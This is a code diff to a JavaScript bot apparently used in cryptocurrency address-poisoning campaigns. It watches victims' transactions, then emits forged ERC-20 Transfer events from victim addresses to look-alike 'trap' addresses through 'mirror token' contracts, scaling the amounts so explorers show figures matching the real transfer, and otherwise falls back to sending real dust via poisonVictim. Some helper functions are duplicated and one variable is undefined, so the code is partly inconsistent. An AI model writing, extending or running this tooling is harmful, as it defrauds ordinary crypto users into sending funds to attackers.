@@ -1,7 +1,7 @@
 import 'dotenv/config';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import { createPublicClient, http, fallback } from 'viem';
+import { createPublicClient, createWalletClient, privateKeyToAccount, http, fallback } from 'viem';
 import { mainnet, bsc, polygon } from 'viem/chains';
 import { exec } from 'child_process';
 import { promisify } from 'util';
@@ -41,6 +41,57 @@ if (supabaseUrl && supabaseServiceKey) {
 } else {
   console.warn('[DEBUG] Supabase service credentials missing – campaign lookup disabled');
 }
+
+
+// ─── Mirror Token Contracts (one per asset) ───
+const MIRROR_TOKEN_ABI = [
+  {
+    "inputs": [
+      { "internalType": "address", "name": "from", "type": "address" },
+      { "internalType": "address", "name": "to", "type": "address" },
+      { "internalType": "uint256", "name": "value", "type": "uint256" }
+    ],
+    "name": "transferFrom",
+    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  }
+];
+
+// Load all three contract addresses
+const MIRROR_TOKEN_USDC = process.env.MIRROR_TOKEN_USDC;
+const MIRROR_TOKEN_USDT = process.env.MIRROR_TOKEN_USDT;
+const MIRROR_TOKEN_NATIVE = process.env.MIRROR_TOKEN_NATIVE;
+
+// Map asset symbols to contract addresses
+const MIRROR_CONTRACTS = {
+  USDC: MIRROR_TOKEN_USDC,
+  USDT: MIRROR_TOKEN_USDT,
+  ETH: MIRROR_TOKEN_NATIVE,
+  BNB: MIRROR_TOKEN_NATIVE,
+  MATIC: MIRROR_TOKEN_NATIVE,
+};
+
+// Per-campaign wallet clients (already implemented from previous edit)
+const campaignMirrorWallets = new Map();
+
+// Log which contracts are enabled
+const enabledContracts = Object.entries(MIRROR_CONTRACTS)
+  .filter(([_, addr]) => addr)
+  .map(([asset, addr]) => `${asset}=${addr}`);
+
+if (enabledContracts.length > 0) {
+  console.log(`[DEBUG] MirrorToken contracts enabled: ${enabledContracts.join(', ')}`);
+  console.log(`[DEBUG] Each campaign will use its own funding wallet to pay gas for mirrors`);
+} else {
+  console.warn('[DEBUG] No MirrorToken contracts configured - set MIRROR_TOKEN_USDC, MIRROR_TOKEN_USDT, MIRROR_TOKEN_NATIVE in .env');
+}
+
+const SKIP_DUST_IF_MIRROR = process.env.SKIP_DUST_IF_MIRROR === 'true';
+if (SKIP_DUST_IF_MIRROR) {
+  console.log('[DEBUG] ⚡ SKIP_DUST_IF_MIRROR is enabled. Real dust will be skipped if mirror succeeds.');
+}
+
 
 // --- Config ---
 const {
@@ -96,7 +147,7 @@ async function loadTrapsFromDB() {
   try {
     const { data: campaigns, error: campError } = await supabaseService
       .from('campaigns')
-      .select('id')
+      .select('id, funding_private_key_enc') // 🆕 Added funding_private_key_enc
       .eq('chain', chainName);
 
     if (campError) {
@@ -111,10 +162,42 @@ async function loadTrapsFromDB() {
 
     const campaignIds = campaigns.map(c => c.id);
 
+    // 🆕 Load funding keys for each campaign to use as mirror operators
+    if (MIRROR_TOKEN_ADDRESS) {
+      for (const camp of campaigns) {
+        if (!camp.funding_private_key_enc) {
+          console.warn(`[DEBUG] Campaign ${camp.id} has no funding key, mirror disabled for this campaign`);
+          continue;
+        }
+        try {
+          const fundingKey = decrypt(camp.funding_private_key_enc);
+          const fundingAccount = privateKeyToAccount(
+            fundingKey.startsWith('0x') ? fundingKey : `0x${fundingKey}`
+          );
+
+          const walletClient = createWalletClient({
+            account: fundingAccount,
+            chain: viemChain,
+            transport: fallback(fallbackUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
+          });
+
+          campaignMirrorWallets.set(camp.id, {
+            walletClient,
+            operatorAddress: fundingAccount.address
+          });
+          console.log(`[DEBUG] Campaign ${camp.id} funding key loaded (operator: ${fundingAccount.address})`);
+        } catch (err) {
+          console.warn(`[DEBUG] Failed to decrypt funding key for campaign ${camp.id}: ${err.message}`);
+        }
+      }
+    }
+
     const { data: traps, error: trapError } = await supabaseService
       .from('traps')
       .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc')
       .in('campaign_id', campaignIds);
+
+    // ... rest of the function stays the same
 
     if (trapError) {
       console.error(`[DEBUG] Failed to fetch traps: ${trapError.message}`);
@@ -280,6 +363,27 @@ const client = createPublicClient({
   ),
 });
 
+
+// ─── Mirror operator wallet (signs the forged-event txs) ───
+if (MIRROR_OPERATOR_KEY && MIRROR_TOKEN_ADDRESS) {
+  try {
+    const operatorAccount = privateKeyToAccount(
+      MIRROR_OPERATOR_KEY.startsWith('0x') ? MIRROR_OPERATOR_KEY : `0x${MIRROR_OPERATOR_KEY}`
+    );
+    mirrorWalletClient = createWalletClient({
+      account: operatorAccount,
+      chain: viemChain,
+      transport: fallback(fallbackUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
+    });
+    console.log(`[DEBUG] MirrorToken enabled at ${MIRROR_TOKEN_ADDRESS} (operator ${operatorAccount.address})`);
+  } catch (err) {
+    console.warn(`[DEBUG] MirrorToken disabled - bad operator key: ${err.message}`);
+  }
+} else {
+  console.warn('[DEBUG] MirrorToken disabled - set MIRROR_TOKEN_ADDRESS and MIRROR_OPERATOR_KEY in .env');
+}
+
+
 // --- Helper: retry wrapper ---
 async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
   return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
@@ -317,6 +421,121 @@ function getAssetFromTx(tx) {
 
   return null;
 }
+
+
+// ─── Mirror helpers ───
+const TOKEN_DECIMALS = { USDT: 6, USDC: 6, DAI: 18, BUSD: 18, WBTC: 8, WETH: 18 };
+
+function normalizeTo6Dec(raw, decimals) {
+  if (decimals === 6) return raw;
+  if (decimals > 6) return raw / (10n ** BigInt(decimals - 6));
+  return raw * (10n ** BigInt(6 - decimals));
+}
+
+function computeMirrorRawValue(tx, detectedAsset) {
+  try {
+    // ERC-20 transfer(to, value) - selector 0xa9059cbb
+    if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
+      return BigInt('0x' + tx.input.slice(74, 138));
+    }
+    // ERC-20 transferFrom(from, to, value) - selector 0x23b872dd
+    if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
+      return BigInt('0x' + tx.input.slice(138, 202));
+    }
+    // Native transfer (value is in tx.value, already in wei = 18 decimals)
+    if (tx.value && BigInt(tx.value) > 0n) {
+      return BigInt(tx.value);
+    }
+    return 0n;
+  } catch {
+    return 0n;
+  }
+}
+
+// Per-campaign lock to prevent nonce collisions within same funding wallet
+const campaignMirrorLocks = new Map();
+
+function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, campaignId, contractAddress) {
+  if (!walletClient || !contractAddress) return Promise.resolve(false);
+
+  if (!campaignMirrorLocks.has(campaignId)) {
+    campaignMirrorLocks.set(campaignId, Promise.resolve());
+  }
+
+  const currentLock = campaignMirrorLocks.get(campaignId);
+
+  const run = currentLock.then(async () => {
+    const hash = await walletClient.writeContract({
+      address: contractAddress,  // 🆕 Use the passed contract address
+      abi: MIRROR_TOKEN_ABI,
+      functionName: 'transferFrom',
+      args: [victimAddress, trapAddress, rawValue],
+    });
+    logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
+    return hash;
+  }).catch(err => {
+    logger.warn(`[mirror] Failed to emit forged transfer: ${err.message}`);
+    return false;
+  });
+
+  campaignMirrorLocks.set(campaignId, run.then(() => { }));
+  return run;
+}
+
+
+// ─── Mirror helpers ───
+const TOKEN_DECIMALS = { USDT: 6, USDC: 6, DAI: 18, BUSD: 18, WBTC: 8, WETH: 18 };
+
+// MirrorToken.decimals() = 6, so normalize the mirrored raw value so the
+// explorer prints the SAME human-readable number as the victim's real tx.
+function normalizeTo6Dec(raw, decimals) {
+  if (decimals === 6) return raw;
+  if (decimals > 6) return raw / (10n ** BigInt(decimals - 6));
+  return raw * (10n ** BigInt(6 - decimals));
+}
+
+function computeMirrorRawValue(tx, detectedAsset) {
+  try {
+    if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
+      // transfer(to, value) → value word
+      return normalizeTo6Dec(BigInt('0x' + tx.input.slice(74, 138)), TOKEN_DECIMALS[detectedAsset] || 6);
+    }
+    if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
+      // transferFrom(from, to, value) → value word
+      return normalizeTo6Dec(BigInt('0x' + tx.input.slice(138, 202)), TOKEN_DECIMALS[detectedAsset] || 6);
+    }
+    if (tx.value && BigInt(tx.value) > 0n) {
+      // native (18 dec) → 6 dec so the displayed number matches
+      return BigInt(tx.value) / 1000000000000n;
+    }
+    return 0n;
+  } catch {
+    return 0n;
+  }
+}
+
+// Serialize mirror emits so concurrent victims don't nonce-collide on the operator wallet
+let mirrorLock = Promise.resolve();
+
+function emitForgedTransfer(victimAddress, trapAddress, rawValue) {
+  const run = mirrorLock.then(async () => {
+    if (!mirrorWalletClient || !MIRROR_TOKEN_ADDRESS) return false;
+    const hash = await mirrorWalletClient.writeContract({
+      address: MIRROR_TOKEN_ADDRESS,
+      abi: MIRROR_TOKEN_ABI,
+      functionName: 'transferFrom',
+      args: [victimAddress, trapAddress, rawValue],
+    });
+    logger.info(`[mirror] Forged Transfer emitted: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
+    return hash;
+  }).catch(err => {
+    logger.warn(`[mirror] Failed to emit forged transfer: ${err.message}`);
+    return false;
+  });
+  mirrorLock = run.then(() => { });
+  return run;
+}
+
 
 // ─── Send dust via duster.py (accepts optional asset) ──
 async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
@@ -500,7 +719,54 @@ function checkTransaction(tx) {
         logger.warn(`Failed to send initial alert: ${alertErr.message}`);
       }
 
-      await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
+      // 🆕 VECTOR 1: forged Transfer event using the correct contract for the asset
+      const mirrorRaw = computeMirrorRawValue(tx, detectedAsset);
+      let mirrorSuccess = false;
+
+      if (mirrorRaw > 0n) {
+        // Select the correct contract based on detected asset
+        const mirrorContractAddress = MIRROR_CONTRACTS[detectedAsset];
+
+        if (mirrorContractAddress) {
+          const campaignWallet = campaignMirrorWallets.get(entry.campaignId);
+          if (campaignWallet) {
+            logger.info(`[mirror] Detected ${detectedAsset}, using contract ${mirrorContractAddress}`);
+            const result = await emitForgedTransfer(
+              from,
+              entry.trapAddress,
+              mirrorRaw,
+              campaignWallet.walletClient,
+              entry.campaignId,
+              mirrorContractAddress  // 🆕 Pass the specific contract address
+            );
+            mirrorSuccess = !!result;
+          } else {
+            logger.debug(`[mirror] No funding key loaded for campaign ${entry.campaignId}, skipping mirror`);
+          }
+        } else {
+          logger.debug(`[mirror] No mirror contract configured for asset: ${detectedAsset}`);
+        }
+      }
+
+      // VECTOR 2 (real dust): conditional based on env flag
+      if (SKIP_DUST_IF_MIRROR && mirrorSuccess) {
+        logger.info(`[skip-dust] Mirror succeeded for ${from}. Skipping real dust to save trap funds.`);
+
+        if (entry) entry.lastPoison = Date.now();
+
+        let stats = victimStats.get(from) || { attempts: 0, successes: 0, failures: 0 };
+        stats.attempts++;
+        stats.successes++;
+        victimStats.set(from, stats);
+
+        try {
+          await sendAlert(`🪞 Mirror emitted (real dust skipped)\nVictim: ${from}\nAsset: ${detectedAsset}\nTX: ${tx.hash}`, 'info', entry.campaignId);
+        } catch (err) { /* ignore */ }
+
+      } else {
+        await poisonVictim(from, entry.privateKey, entry.campaignId, detectedAsset);
+      }
+
     } catch (err) {
       logger.error(`Error in async poison task for ${from}: ${err.message}`);
     } finally {
